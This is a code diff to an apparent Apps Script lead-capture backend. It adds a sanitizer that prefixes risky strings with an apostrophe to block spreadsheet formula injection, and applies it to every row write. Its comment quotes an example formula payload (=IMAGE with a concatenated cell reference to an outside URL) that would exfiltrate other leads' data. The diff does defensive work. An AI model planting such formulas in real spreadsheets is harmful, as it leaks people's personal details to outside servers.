@@ -284,6 +284,31 @@ function licensedCell(d) { return isLicensedState(d.state) ? 'Yes' : 'No'; }
 // a new tab, deliberately not a revival of 'heloc-hei', whose tab holds rows
 // under different columns.
 
+/**
+ * A visitor's text, made safe to write into a cell.
+ *
+ * WHY. appendRow treats a string that starts with "=" as a formula, and every
+ * text field on every form is typed by the public. A "first name" of
+ * =IMAGE("https://example.com/?"&B2) or =IMPORTXML(...) would become a live
+ * formula in Darren's Sheet, able to send other leads' details to someone
+ * else's server the moment the tab is opened (security pass, 10 Oct). A
+ * leading apostrophe makes Sheets store the text as typed; it is not shown,
+ * and getValues reads the text back without it, so nothing downstream changes.
+ *
+ * Only strings that could start a formula are touched: "=" or "@" first, a
+ * tab or carriage return first, or "+" or "-" followed by a letter (a function
+ * name). Numbers, and phone numbers such as "+1 714 ...", are left as they are.
+ */
+function safeCell(v) {
+  if (typeof v !== 'string') return v;
+  return /^[=@\t\r]|^[+-]\s*[A-Za-z]/.test(v) ? "'" + v : v;
+}
+
+/** appendRow for anything that holds a visitor's input. */
+function appendSafeRow(sheet, row) {
+  sheet.appendRow(row.map(safeCell));
+}
+
 /** A number the visitor may have skipped: blank when absent, and 0 kept as 0. */
 function optionalCell(v) {
   return v === undefined || v === null || v === '' ? '' : v;
@@ -1123,7 +1148,7 @@ function trimDebugTab(ss) {
 function logDebug(ss, message, email) {
   try {
     const sheet = getOrCreateSheet(ss, 'Debug', DEBUG_HEADERS);
-    sheet.appendRow([new Date().toISOString(), message, email || '']);
+    appendSafeRow(sheet, [new Date().toISOString(), message, email || '']);
   } catch (err) {
     // never let debug logging itself break the lead flow
   }
@@ -1280,7 +1305,7 @@ function doPost(e) {
 
     if (data.source === 'newsletter') {
       const sheet = getOrCreateSheet(ss, 'Newsletter', NEWSLETTER_HEADERS);
-      sheet.appendRow([
+      appendSafeRow(sheet, [
         data.timestamp || new Date().toISOString(),
         data.email     || '',
         'newsletter'
@@ -1289,10 +1314,10 @@ function doPost(e) {
       // Each landing funnel writes to its OWN tab with its own columns.
       const schema = SOURCE_SCHEMAS[data.source];
       const sheet = getOrCreateSheet(ss, schema.tab, schema.headers);
-      sheet.appendRow(schema.row(data));
+      appendSafeRow(sheet, schema.row(data));
     } else if (data.source === 'QualifyForm') {
       const sheet = getOrCreateSheet(ss, 'Qualify', QUALIFY_HEADERS);
-      sheet.appendRow([
+      appendSafeRow(sheet, [
         data.timestamp   || new Date().toISOString(),
         data.firstName   || '',
         data.lastName    || '',
@@ -1308,7 +1333,7 @@ function doPost(e) {
       ].concat(attrRow(data), triageRow(data)));
     } else if (data.source === 'DebtConsolidation') {
       const sheet = getOrCreateSheet(ss, 'Debt Consolidation', DEBT_CONSOLIDATION_HEADERS);
-      sheet.appendRow([
+      appendSafeRow(sheet, [
         data.timestamp            || new Date().toISOString(),
         data.firstName            || '',
         data.lastName             || '',
@@ -1351,7 +1376,7 @@ function doPost(e) {
       ));
     } else {
       const sheet = getOrCreateSheet(ss, 'Leads', LEAD_HEADERS);
-      sheet.appendRow([
+      appendSafeRow(sheet, [
         data.timestamp            || new Date().toISOString(),
         data.firstName            || '',
         data.lastName             || '',
@@ -1536,7 +1561,7 @@ function claimDecision(status, processedAt, now) {
 
 function enqueueFollowUp(ss, data, raw) {
   const sheet = getOrCreateSheet(ss, FOLLOWUP_TAB, FOLLOWUP_HEADERS);
-  sheet.appendRow([
+  appendSafeRow(sheet, [
     new Date().toISOString(), 'pending', '', '', data.source || '', data.email || '', raw
   ]);
 }
